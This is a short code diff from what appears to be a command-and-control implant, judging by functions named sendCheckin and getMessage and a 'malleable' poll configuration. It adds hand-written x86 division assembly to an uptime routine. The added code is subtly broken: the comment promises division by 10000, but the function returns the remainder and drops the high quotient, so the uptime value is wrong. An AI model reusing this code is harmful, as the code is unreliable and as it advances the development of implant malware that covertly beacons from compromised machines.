@@ -210,7 +210,24 @@ static uint64_t getUptimeMs(functionTable* nt) {
     uint64_t curTime  = *(uint64_t*)(info + 8);
     // Both are FILETIME (100ns intervals since Jan 1, 1601)
     uint64_t diff100ns = curTime - bootTime;
+    // Divides diff100ns by 10000 using CPU's native 32-bit DIV
+    // (avoids __udivdi3 libcall on x86)
+#ifdef __i386__
+    uint32_t hi = (uint32_t)(diff100ns >> 32);
+    uint32_t lo = (uint32_t)diff100ns;
+    uint32_t q1, r1, q2, r2;
+    if (hi == 0) {
+        __asm__("divl %4" : "=a"(q1), "=d"(r1) : "d"(0U), "a"(lo), "rm"(10000U));
+        r2 = r1; q2 = q1; q1 = 0;
+    } else {
+        __asm__("divl %4" : "=a"(q1), "=d"(r1) : "d"(0U), "a"(hi), "rm"(10000U));
+        __asm__("divl %4" : "=a"(q2), "=d"(r2) : "d"(r1), "a"(lo), "rm"(10000U));
+    }
+    (void)q1; (void)q2;
+    return r2;
+#else
     return diff100ns / 10000ULL;
+#endif
 }
 
 // -- sendCheckin -----------------------------------------------------
@@ -651,7 +668,7 @@ std::pair<void*, size_t> getMessage(void) {
         if (expanded_suffix) __free(expanded_suffix);
     }
 
-    // Poll always uses GET — build path with query string using POLL malleable config
+    // Poll always uses GET, build path with query string using POLL malleable config
     wchar_t* full_path = NULL;
     size_t b64_len = __strlen(b64);
 
